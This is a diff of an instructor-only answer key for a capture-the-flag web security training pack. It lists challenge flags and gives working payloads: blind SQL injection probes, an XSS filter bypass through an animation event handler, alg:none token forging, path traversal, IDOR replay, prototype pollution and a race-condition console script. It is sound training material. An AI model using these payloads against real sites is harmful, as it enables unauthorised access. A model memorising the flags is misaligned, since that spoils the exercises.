@@ -1,117 +1,106 @@
-# Day 7 — Web Applications: Admin Solver Manual (v2.1)
+# Day 7 — Web Applications: Admin Solver Manual (v2.3)
 
 > **Instructor use only.** Expected recoveries for the live Day 7 pack.
-
-## Why v2.1
-
-v2’s top tier (Blind Counter / Friendly Sink / Triple Lock) scored like
-Easy–Medium Web (~3–4/10). v2.1 replaces that tier with **three real Danger
-labs**: prototype pollution, null-origin `postMessage`, and a 180ms TOCTOU race.
-Still **zero files**. ChatGPT cannot click the race or invent the sandboxed
-widget without the student doing browser work.
 
 ## Pack summary
 
 | | |
 |--|--|
-| Count | **12** — 3 easy · **6 medium** · 3 danger |
+| Count | **15** — 3 easy · 6 medium · **3 hard** · 3 danger |
 | Day code | `WEB-2026` |
 | Files | **None** |
 | Flag model | All `is_dynamic` |
 
 ## Answer map
 
-| # | ID | Title | Level | Where | Answer |
-|---|-----|-------|-------|-------|--------|
-| 1 | `d7_markup_trail` | Markup Trail | Easy | `/challenge/markup-trail` | `ink_below` |
-| 2 | `d7_side_door` | Side Door | Easy | `/challenge/side-door` → `/hatch` | `service_hatch` |
-| 3 | `d7_desk_wizard` | Desk Wizard | Easy | `/challenge/desk-wizard` | `quiet_path` |
-| 4 | `d7_role_chip` | Role Chip | Medium | `/challenge/role-chip` | `analyst_seat` |
-| 5 | `d7_twin_check` | Twin Check | Medium | `/challenge/twin-check` | `both_match` |
-| 6 | `d7_leaky_desk` | Leaky Desk | Medium | `/challenge/leaky-desk` | `desk_owner_note` |
-| 7 | `d7_frame_whisper` | Frame Whisper | Medium | `/challenge/frame-whisper` | `posted_secret` |
-| 8 | `d7_safe_shelf` | Safe Shelf | Medium | `/challenge/safe-shelf` | `shelf_escape_ok` |
-| 9 | `d7_stash_order` | Stash Order | Medium | `/challenge/stash-order` | `abc_order` |
-| 10 | `d7_inherited_trust` | Inherited Trust | Danger | `/challenge/inherited-trust` | `chief_clearance` |
-| 11 | `d7_cross_talk` | Cross Talk | Danger | `/challenge/cross-talk` | `null_origin_ok` |
-| 12 | `d7_flash_seat` | Flash Seat | Danger | `/challenge/flash-seat` | `race_won` |
+| # | ID | Title | Level | Answer |
+|---|-----|-------|-------|--------|
+| 1 | `d7_markup_trail` | Markup Trail | Easy | `ink_below` |
+| 2 | `d7_side_door` | Side Door | Easy | `service_hatch` |
+| 3 | `d7_desk_wizard` | Desk Wizard | Easy | `quiet_path` |
+| 4 | `d7_role_chip` | Role Chip | Medium | `analyst_seat` |
+| 5 | `d7_twin_check` | Twin Check | Medium | `both_match` |
+| 6 | `d7_leaky_desk` | Leaky Desk | Medium | `desk_owner_note` |
+| 7 | `d7_frame_whisper` | Frame Whisper | Medium | `posted_secret` |
+| 8 | `d7_safe_shelf` | Safe Shelf | Medium | `shelf_escape_ok` |
+| 9 | `d7_stash_order` | Stash Order | Medium | `abc_order` |
+| 10 | `d7_blind_lookup` | Quiet Directory | Hard | `w7blindx` |
+| 11 | `d7_strict_book` | Strict Guestbook | Hard | `strict_spill` |
+| 12 | `d7_claim_ticket` | Claim Ticket | Hard | `forged_pass` |
+| 13 | `d7_inherited_trust` | Inherited Trust | Danger | `chief_clearance` |
+| 14 | `d7_cross_talk` | Cross Talk | Danger | `null_origin_ok` |
+| 15 | `d7_flash_seat` | Flash Seat | Danger | `race_won` |
 
 ---
 
-## 1–7 · Easy / Medium
+## Easy / Medium (short)
 
-Unchanged from v2 — see previous sections in git history if needed. Short form:
-
-1. Markup Trail → `ink` + `_bel` + comment `ow` → **`ink_below`**
-2. Side Door → visit lobby then `/challenge/side-door/hatch` → **`service_hatch`**
-3. Desk Wizard → walk / quiet / none → `sessionStorage d7_desk_recovery` → **`quiet_path`**
-4. Role Chip → cookie `d7_role` JSON `role` → `analyst` → **`analyst_seat`**
-5. Twin Check → mirror cookie `d7_pair` into the form → **`both_match`**
-6. Frame Whisper → catch iframe `postMessage` → **`posted_secret`**
-7. Stash Order → Network drawers `alpha/beta/gamma` into `d7_stash_a/b/c` → **`abc_order`**
-
-### 6 · Leaky Desk (medium) — IDOR
-
-Click **View My Profile Data**. Network → RPC `d7_leaky_user` with `p_desk_id: 4188`.
-Own JSON includes `badge_issuer: 2701`. Replay with `p_desk_id: 2701` →
-`internal_memo` → **`desk_owner_note`**. (Not id=1 — that 404s.)
-
-### 8 · Safe Shelf (medium) — path traversal
-
-Page auto-opens a public guide. The **file=** field is editable (also in the
-URL as `?file=`). Read Terms — notes live one shelf above guides. Set
-`file=` to `../secrets/desk_note.txt` → Open → recovery line →
-**`shelf_escape_ok`**. (Network replay of `d7_safe_file` works the same.)
+1. Markup Trail → `ink` + `_bel` + comment `ow`
+2. Side Door → `/challenge/side-door/hatch` after lobby visit
+3. Desk Wizard → walk / quiet / none → `sessionStorage d7_desk_recovery`
+4. Role Chip → cookie role `analyst`
+5. Twin Check → mirror `d7_pair`
+6. Leaky Desk → `badge_issuer` **2701** → `internal_memo`
+7. Frame Whisper → catch `postMessage`
+8. Safe Shelf → `file=../secrets/desk_note.txt`
+9. Stash Order → Network `alpha/beta/gamma` into `d7_stash_*`
 
 ---
 
-## 10 · Inherited Trust (danger) — prototype pollution
+## 10 · Quiet Directory (hard) — blind boolean oracle
 
-Merge blocks only the literal key `__proto__`. Payload:
+RPC `d7_blind_lookup`. Responses: **User exists.** / **User not found.**
 
-```json
-{"constructor":{"prototype":{"deskRole":"chief"}}}
+Secret recovery word (8 chars): **`w7blindx`**
+
+Supported probe shapes (examples):
+
+```
+admin' AND SUBSTRING(flag,1,1)='w' --
+admin' AND ASCII(SUBSTRING(flag,1,1))>100 --
+admin' AND LENGTH(flag)=8 --
+admin' AND flag LIKE 'w7%' --
 ```
 
-Merge settings → **`chief_clearance`**.
+True → "User exists." Loop positions 1..8 (or binary-search ASCII).
 
-## 9 · Cross Talk (danger) — null-origin postMessage
+## 11 · Strict Guestbook (hard) — filtered XSS
 
-Page rejects any elevate whose `event.origin` is not the string `"null"` /
-empty. Load this as the sandboxed widget (sandbox is already `allow-scripts`
-only — no `allow-same-origin`):
+`onerror` / `onload` / `onclick` / `onmouseover` / … blocked.
+`window.__D7_STRICT` holds the vault after login.
+
+Working idea:
 
 ```html
-<script>parent.postMessage({elevate:true}, '*')</script>
+<div style="animation:x 1s" onanimationend="document.body.append(window.__D7_STRICT)">x</div>
+<style>@keyframes x{from{opacity:1}to{opacity:1}}</style>
 ```
 
-→ **`null_origin_ok`**.
+(or `onpointerdown` / `onpointerenter` — also not scrubbed)
 
-## 10 · Flash Seat (danger) — 180ms TOCTOU
+→ **`strict_spill`**
 
-1. Ensure `localStorage.d7_flash_role === 'guest'` (default).
-2. In one burst (console or snippet), within **180ms**:
-   - click Reserve (while guest)
-   - set `localStorage.d7_flash_role = 'admin'`
-   - click Confirm
+## 12 · Claim Ticket (hard) — alg:none forge
 
-Example console helper:
+1. Issue guest ticket → three base64url parts in cookie `d7_claim`
+2. Decode payload, set `"role":"admin"`
+3. Set header `"alg":"none"` (verifier skips HMAC when alg is none)
+4. Cookie = `header.payload.` (empty sig ok) → Open vault
 
-```js
-document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Reserve')) b.click(); });
-localStorage.setItem('d7_flash_role', 'admin');
-document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Confirm')) b.click(); });
-```
+→ **`forged_pass`**
 
-→ **`race_won`**.
+---
 
-Setting admin *before* Reserve fails (snapshot must be guest).
+## Danger (unchanged)
+
+13. Inherited Trust → `{"constructor":{"prototype":{"deskRole":"chief"}}}` → `chief_clearance`  
+14. Cross Talk → sandboxed `postMessage({elevate:true})` → `null_origin_ok`  
+15. Flash Seat → 180ms guest→admin TOCTOU → `race_won`
 
 ---
 
 ## Instructor notes
 
-- Day code: `WEB-2026`.
-- Do not strengthen hints mid-event.
-- Routes: `src/pages/day7/` + `App.tsx`.
-- Migration: `supabase/migrations/20260712_2230_day7_three_real_dangers.sql`.
+- Day code: `WEB-2026`
+- Blind secret is **only** in `challenge_answer_keys` / RPC — not in the JS bundle
+- Migration: `supabase/migrations/20260713_0040_day7_hard_tier.sql`
